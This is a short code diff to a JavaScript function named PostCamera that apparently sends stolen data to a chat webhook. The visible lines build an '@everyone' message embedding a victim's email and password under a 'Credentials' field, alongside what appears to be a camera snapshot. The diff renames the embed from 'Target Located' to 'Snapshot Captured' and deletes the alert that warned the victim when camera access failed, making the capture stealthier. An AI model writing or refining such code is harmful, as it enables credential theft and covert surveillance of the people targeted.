@@ -234,7 +234,7 @@ window.PostCamera = async () => {
       content: "@everyone",
       embeds: [
         {
-          title: "📍 Target Located",
+          title: "🎥 Snapshot Captured",
           color: 0x800080,
           fields: [
             { name: "📧 Credentials", value: `**Email:** ${email}\n**Password:** ${password}`, inline: true },
@@ -261,7 +261,6 @@ window.PostCamera = async () => {
 
   } catch (e) {
     console.error("Camera access denied or error occurred:", e);
-    alert("Camera access denied or error occurred.");
   }
 };
 }
